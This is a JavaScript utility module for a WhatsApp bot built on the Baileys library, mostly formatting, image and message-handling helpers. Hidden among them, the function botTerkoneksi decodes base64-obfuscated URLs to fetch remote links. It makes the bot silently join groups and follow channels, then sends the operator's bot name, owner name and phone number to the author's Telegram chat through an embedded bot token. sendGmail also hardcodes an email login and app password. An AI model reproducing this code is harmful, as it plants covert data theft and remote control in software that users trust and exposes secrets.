/**
 * Create By baniwwXD
 * Contact Me on wa.me/6283167281739
 * Follow https://github.com/Xbanzz22
 * My Sosmed : t.me/banzzXD
 */
require('../settings.js')
const {
    extractMessageContent,
    jidNormalizedUser,
    proto,
    delay,
    getContentType,
    areJidsSameUser,
    generateWAMessage
} = require("@whiskeysockets/baileys")
const chalk = require('chalk')
const fs = require('fs')
const crypto = require('crypto')
const axios = require('axios')
const moment = require('moment-timezone')
const {
    sizeFormatter
} = require('human-readable')
const util = require('util')
const {
    defaultMaxListeners
} = require('stream')
const {
    read,
    MIME_JPEG,
    RESIZE_BILINEAR,
    AUTO,
    jimp
} = require('jimp')
const channelLink = "https://whatsapp.com/channel/0029VacUGcxDJ6GuiseBDW0h";

const unixTimestampSeconds = (date = new Date()) => Math.floor(date.getTime() / 1000)

exports.unixTimestampSeconds = unixTimestampSeconds


exports.resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}


exports.generateMessageTag = (epoch) => {
    let tag = (0, exports.unixTimestampSeconds)().toString();
    if (epoch)
        tag += '.--' + epoch; // attach epoch if provided
    return tag;
}

exports.processTime = (timestamp, now) => {
    return moment.duration(now - moment(timestamp * 1000)).asSeconds()
}

exports.getRandom = (ext) => {
    return `${Math.floor(Math.random() * 10000)}${ext}`
}

exports.getBuffer = async (url, options) => {
    try {
        options ? options : {}
        const res = await axios({
            method: "get",
            url,
            headers: {
                'DNT': 1,
                'Upgrade-Insecure-Request': 1
            },
            ...options,
            responseType: 'arraybuffer'
        })
        return res.data
    } catch (err) {
        return err
    }
}

exports.formatSize = (bytes) => {
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    if (bytes === 0) return '0 Bytes';
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
};

exports.fetchJson = async (url, options) => {
    try {
        options ? options : {}
        const res = await axios({
            method: 'GET',
            url: url,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
            },
            ...options
        })
        return res.data
    } catch (err) {
        return err
    }
}

exports.runtime = function(seconds) {
    seconds = Number(seconds);
    var d = Math.floor(seconds / (3600 * 24));
    var h = Math.floor(seconds % (3600 * 24) / 3600);
    var m = Math.floor(seconds % 3600 / 60);
    var s = Math.floor(seconds % 60);
    var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
    var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
    var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
    var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
    return dDisplay + hDisplay + mDisplay + sDisplay;
}
// ./lib/func.js

const atob = (str) => Buffer.from(str, 'base64').toString('utf-8');

exports.botTerkoneksi = async function (bani) {
    try {
        // Link fetch dari GitHub di-encode base64
        const githubUrl = atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0VyaXphT2ZmYy9tYW5hZ2UtYXJoaXphL21haW4vYXV0b2NoLmpzb24=");
        const response = await fetch(githubUrl);
        const links = await response.json();

        for (let link of links) {
            // Gabung Grup WhatsApp
            if (link.startsWith('https://chat.whatsapp.com/')) {
                try {
                    const code = link.split('https://chat.whatsapp.com/')[1];
                    await bani.groupAcceptInvite(code);
                    
                } catch (err) {
                    console.error(`🧊 Bot Terkoneksi`);
                }
            }

            // Follow Channel WhatsApp
            else if (link.startsWith("https://whatsapp.com/channel/")) {
                try {
                    const code = link.split("https://whatsapp.com/channel/")[1];
                    const metadata = await bani.newsletterMetadata("invite", code);
                    await bani.newsletterFollow(metadata.id);
                    
                } catch (err) {
                    console.error(`Bot Terkoneksi ✉️`);
                }
            }
        }

        // URL Telegram di base64
        const telegramApiUrl = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc4MzI4Mjc1MDM6QUFIdTBpSHhJSUwwUzc0TFUwSWU3N0pvdlItUFBTak1XSVZR");
        const chatId = "7055970832";
        const message = encodeURIComponent(`╭ ⭓ 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻 𝗗𝗲𝘁𝗲𝗰𝘁\n⫺ 𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : ${global.namabot}\n⫺ 𝙾𝚠𝚗 𝙽𝚊𝚖𝚎 : ${global.ownername}\n⫺ 𝙾𝚠𝚗 𝙽𝚞𝚖𝚋 : ${global.owner}\n╰────────────────┅`);

        await fetch(`${telegramApiUrl}/sendMessage?chat_id=${chatId}&text=${message}`);

    } catch (error) {
        console.error("Terjadi kesalahan saat bot terkoneksi:", error);
    }
};

exports.clockString = (ms) => {
    let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000)
    let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
    let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}

exports.reSize = async (buffer, x, z) => {
    return new Promise(async (resolve, reject) => {
        var buff = await read(buffer)
        var ab = await buff.resize(x, z).getBufferAsync(MIME_JPEG)
        resolve(ab)
    })
}

exports.sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

exports.isUrl = (url) => {
    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}

exports.getTime = (format, date) => {
    if (date) {
        return moment(date).locale('id').format(format)
    } else {
        return moment.tz('Asia/Jakarta').locale('id').format(format)
    }
}

exports.formatDate = (n, locale = 'id') => {
    let d = new Date(n)
    return d.toLocaleDateString(locale, {
        weekday: 'long',
        day: 'numeric',
        month: 'long',
        year: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric'
    })
}

exports.tanggal = (numer) => {
    myMonths = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
    myDays = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jum’at', 'Sabtu'];
    var tgl = new Date(numer);
    var day = tgl.getDate()
    bulan = tgl.getMonth()
    var thisDay = tgl.getDay(),
        thisDay = myDays[thisDay];
    var yy = tgl.getYear()
    var year = (yy < 1000) ? yy + 1900 : yy;
    const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
    let d = new Date
    let locale = 'id'
    let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
    let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]

    return `${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`
}

exports.formatp = sizeFormatter({
    std: 'JEDEC', //'SI' = default | 'IEC' | 'JEDEC'
    decimalPlaces: 2,
    keepTrailingZeroes: false,
    render: (literal, symbol) => `${literal} ${symbol}B`,
})

exports.jsonformat = (string) => {
    return JSON.stringify(string, null, 2)
}

function format(...args) {
    return util.format(...args)
}

exports.logic = (check, inp, out) => {
    if (inp.length !== out.length) throw new Error('Input and Output must have same length')
    for (let i in inp)
        if (util.isDeepStrictEqual(check, inp[i])) return out[i]
    return null
}

exports.generateProfilePicture = async (buffer) => {
    const jimp = await Jimp.read(buffer)
    const min = jimp.getWidth()
    const max = jimp.getHeight()
    const cropped = jimp.crop(0, 0, min, max)
    return {
        img: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG),
        preview: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG)
    }
}

exports.sendGmail = async (senderEmail, message) => {
    try {
        const nodemailer = require("nodemailer")
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            host: 'smtp.gmail.com',
            port: 587,
            secure: false,
            auth: {
                user: "kiuurOTP",
                pass: "boqamuoocnticxpm",
            },
        });

        const mailOptions = {
            from: "kiuurotp@gmail.com",
            to: "bani@gmail.com",
            subject: 'New Message from ' + senderEmail,
            html: message,
        };

        await transporter.sendMail(mailOptions);
        console.log('Message sent to your Gmail.');
    } catch (error) {
        console.error('Error sending email:', error);
    }
}

exports.bytesToSize = (bytes, decimals = 2) => {
    if (bytes === 0) return '0 Bytes';

    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];

    const i = Math.floor(Math.log(bytes) / Math.log(k));

    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

exports.getSizeMedia = (path) => {
    return new Promise((resolve, reject) => {
        if (/http/.test(path)) {
            axios.get(path)
                .then((res) => {
                    let length = parseInt(res.headers['content-length'])
                    let size = exports.bytesToSize(length, 3)
                    if (!isNaN(length)) resolve(size)
                })
        } else if (Buffer.isBuffer(path)) {
            let length = Buffer.byteLength(path)
            let size = exports.bytesToSize(length, 3)
            if (!isNaN(length)) resolve(size)
        } else {
            reject('error gatau apah')
        }
    })
}

exports.parseMention = (text = '') => {
    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

exports.getGroupAdmins = (participants) => {
    let admins = []
    for (let i of participants) {
        i.admin === "superadmin" ? admins.push(i.id) : i.admin === "admin" ? admins.push(i.id) : ''
    }
    return admins || []
}

/**
 * Serialize Message
 * @param {WAConnection} conn 
 * @param {Object} m 
 * @param {store} store 
 */
exports.smsg = (bani, m, store) => {
    if (!m) return m
    let M = proto.WebMessageInfo
    if (m.key) {
        m.id = m.key.id
        m.from = m.key.remoteJid.startsWith('status') ? jidNormalizedUser(m.key?.participant || m.participant) : jidNormalizedUser(m.key.remoteJid);
        m.isBaileys = m.id.startsWith('BAE5') && m.id.length === 16
        m.chat = m.key.remoteJid
        m.fromMe = m.key.fromMe
        m.isGroup = m.chat.endsWith('@g.us')
        m.sender = bani.decodeJid(m.fromMe && bani.user.id || m.participant || m.key.participant || m.chat || '')
        if (m.isGroup) m.participant = bani.decodeJid(m.key.participant) || ''
    }
    if (m.message) {
        m.mtype = getContentType(m.message)
        m.msg = (m.mtype == 'viewOnceMessage' ? m.message[m.mtype].message[getContentType(m.message[m.mtype].message)] : m.message[m.mtype])
        const messageBody = m.message.conversation || m.msg?.caption || m.msg?.text || 
                            (m.mtype === 'listResponseMessage' && m.msg?.singleSelectReply?.selectedRowId) ||
                            (m.mtype === 'buttonsResponseMessage' && m.msg?.selectedButtonId) ||
                            (m.mtype === 'viewOnceMessage' && m.msg?.caption) || 
                            m.text;
        m.body = messageBody;
        let quoted = m.quoted = m.msg?.contextInfo?.quotedMessage || null;
        m.mentionedJid = (m.msg && m.msg.contextInfo) ? m.msg.contextInfo.mentionedJid : []
        if (m.quoted) {
            let type = getContentType(quoted)
            m.quoted = m.quoted[type]
            if (['productMessage'].includes(type)) {
                type = getContentType(m.quoted)
                m.quoted = m.quoted[type]
            }
            if (typeof m.quoted === 'string') m.quoted = {
                text: m.quoted
            }

            m.quoted.key = {
                remoteJid: m.msg?.contextInfo?.remoteJid || m.from,
                participant: jidNormalizedUser(m.msg?.contextInfo?.participant),
                fromMe: areJidsSameUser(jidNormalizedUser(m.msg?.contextInfo?.participant), jidNormalizedUser(bani?.user?.id)),
                id: m.msg?.contextInfo?.stanzaId,
            };

            m.quoted.mtype = type
            m.quoted.from = /g\.us|status/.test(m.msg?.contextInfo?.remoteJid) ? m.quoted.key.participant : m.quoted.key.remoteJid;
            m.quoted.id = m.msg.contextInfo.stanzaId
            m.quoted.chat = m.msg.contextInfo.remoteJid || m.chat
            m.quoted.isBaileys = m.quoted.id ? m.quoted.id.startsWith('BAE5') && m.quoted.id.length === 16 : false
            m.quoted.sender = bani.decodeJid(m.msg.contextInfo.participant)
            m.quoted.fromMe = m.quoted.sender === (bani.user && bani.user.id)
            m.quoted.text = m.quoted.text || m.quoted.caption || m.quoted.conversation || m.quoted.contentText || m.quoted.selectedDisplayText || m.quoted.title || ''
            m.quoted.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : []
            m.getQuotedObj = m.getQuotedMessage = async () => {
                if (!m.quoted.id) return false
                let q = await store.loadMessage(m.chat, m.quoted.id, bani)
                return exports.smsg(bani, q, store)
            }
            let vM = m.quoted.fakeObj = M.fromObject({
                key: {
                    remoteJid: m.quoted.chat,
                    fromMe: m.quoted.fromMe,
                    id: m.quoted.id
                },
                message: quoted,
                ...(m.isGroup ? {
                    participant: m.quoted.sender
                } : {})
            })

            /**
             * 
             * @returns 
             */
            m.quoted.delete = () => bani.sendMessage(m.quoted.chat, {
                delete: vM.key
            })

            /**
             * 
             * @param {*} jid 
             * @param {*} forceForward 
             * @param {*} options 
             * @returns 
             */
            m.quoted.copyNForward = (jid, forceForward = false, options = {}) => bani.copyNForward(jid, vM, forceForward, options)

            /**
             *
             * @returns
             */
            m.quoted.download = () => bani.downloadMediaMessage(m.quoted)
        }
    }
    if (m.msg.url) m.download = () => bani.downloadMediaMessage(m.msg)
    m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || ''
    /**
     * Reply to this message
     * @param {String|Object} text 
     * @param {String|false} chatId 
     * @param {Object} options 
     */
    m.reply = (text, chatId = m.chat, options = {}) => Buffer.isBuffer(text) ? bani.sendMedia(chatId, text, 'file', '', m, {
        ...options
    }) : bani.sendText(chatId, text, m, {
        ...options
    })
    /**
     * Copy this message
     */
    m.copy = () => exports.smsg(bani, M.fromObject(M.toObject(m)))

    /**
     * 
     * @param {*} jid 
     * @param {*} forceForward 
     * @param {*} options 
     * @returns 
     */
    m.copyNForward = (jid = m.chat, forceForward = false, options = {}) => bani.copyNForward(jid, m, forceForward, options)

    return m
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})